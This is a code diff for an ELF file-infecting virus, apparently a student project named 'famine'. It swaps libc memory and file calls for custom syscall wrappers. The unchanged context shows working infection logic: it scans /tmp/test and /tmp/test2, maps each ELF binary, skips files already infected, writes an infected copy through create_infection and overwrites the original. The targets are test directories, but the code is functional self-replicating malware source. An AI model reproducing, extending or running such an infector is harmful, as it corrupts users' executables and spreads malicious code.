@@ -1,16 +1,5 @@
 #include "famine.h"
 
-void	_close(int fd)
-{
-	asm volatile (".intel_syntax;\n" \
-	"	mov rax, 0x3\n" \
-	"	mov rdi, %0\n" \
-	"	syscall\n" \
-	"	leave\n" \
-	"	ret\n" \
-	: "=r" (fd));
-}
-
 int			get_size_needed(t_elf *elf, t_elf *virus_elf)
 {
 	Elf64_Phdr	*next;
@@ -91,9 +80,9 @@ void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 				elf.filename = file;
 				elf.size = lseek(fd, (size_t)0, SEEK_END);
 				if (elf.size < 0 ||
-(elf.addr = mmap(NULL, elf.size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
+(elf.addr = __mmap(NULL, elf.size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
 				{
-					_close(fd);
+					__close(fd);
 					if (DEBUG)
 						debug_print_error(0, virus_elf->filename, file);
 					return ;
@@ -102,8 +91,8 @@ void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 				{
 					if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
 					{
-						munmap(elf.addr, elf.size);
-						_close(fd);
+						__munmap(elf.addr, elf.size);
+						__close(fd);
 						if (DEBUG)
 							debug_print_error(ret, virus_elf->filename, file);
 						return ;
@@ -120,23 +109,23 @@ void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 						printf("final size: %ld\n", elf.size + size_needed + nb_zero_to_add);
 					}
 					char	*new;
-					new = mmap(NULL, elf.size + size_needed + nb_zero_to_add, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
+					new = __mmap(NULL, elf.size + size_needed + nb_zero_to_add, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
 					if (!new)
 					{
-						munmap(elf.addr, elf.size);
-						_close(fd);
+						__munmap(elf.addr, elf.size);
+						__close(fd);
 						if (DEBUG)
 							debug_print_error(ret, virus_elf->filename, file);
 						return ;
 					}
 					create_infection(new, &elf, virus_elf, nb_zero_to_add);
-					munmap(elf.addr, elf.size);
-					_close(fd);
+					__munmap(elf.addr, elf.size);
+					__close(fd);
 					fd = open(file, O_TRUNC | O_WRONLY);
 					if (fd < 0)
 						return ;
 					write(fd, new, elf.size + size_needed + nb_zero_to_add);
-					munmap(new, elf.size + size_needed + nb_zero_to_add);
+					__munmap(new, elf.size + size_needed + nb_zero_to_add);
 				}
 				else if (DEBUG)
 					printf("%s already infected.\n", file);
@@ -144,7 +133,7 @@ void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 		}
 		else if (DEBUG)
 			debug_print_error(ret, virus_elf->filename, file);
-		_close(fd);
+		__close(fd);
 	}
 }
 
@@ -197,25 +186,25 @@ int		main(int argc, char *argv[])
 			elf.filename = argv[0];
 			elf.size = lseek(fd, (size_t)0, SEEK_END);
 			if (elf.size < 0 ||
-	(elf.addr = mmap(NULL, elf.size, PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
+	(elf.addr = __mmap(NULL, elf.size, PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
 			{
-				_close(fd);
+				__close(fd);
 				if (DEBUG)
 					debug_print_error(0, argv[0], argv[0]);
 				return (1);
 			}
 			if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
 			{
-				munmap(elf.addr, elf.size);;
-				_close(fd);
+				__munmap(elf.addr, elf.size);;
+				__close(fd);
 				if (DEBUG)
 					debug_print_error(0, argv[0], argv[0]);
 				return (1);
 			}
 			moving_through_path(&elf, "/tmp/test", "");
 			moving_through_path(&elf, "/tmp/test2", "");
-			munmap(elf.addr, elf.size);
-			_close(fd);
+			__munmap(elf.addr, elf.size);
+			__close(fd);
 		}
 		else
 			printf("Host\n");
@@ -223,6 +212,6 @@ int		main(int argc, char *argv[])
 	}
 	else if (DEBUG)
 		debug_print_error(0, argv[0], argv[0]);
-	exit(0);
+	__exit(0);
 	return (0);
 }
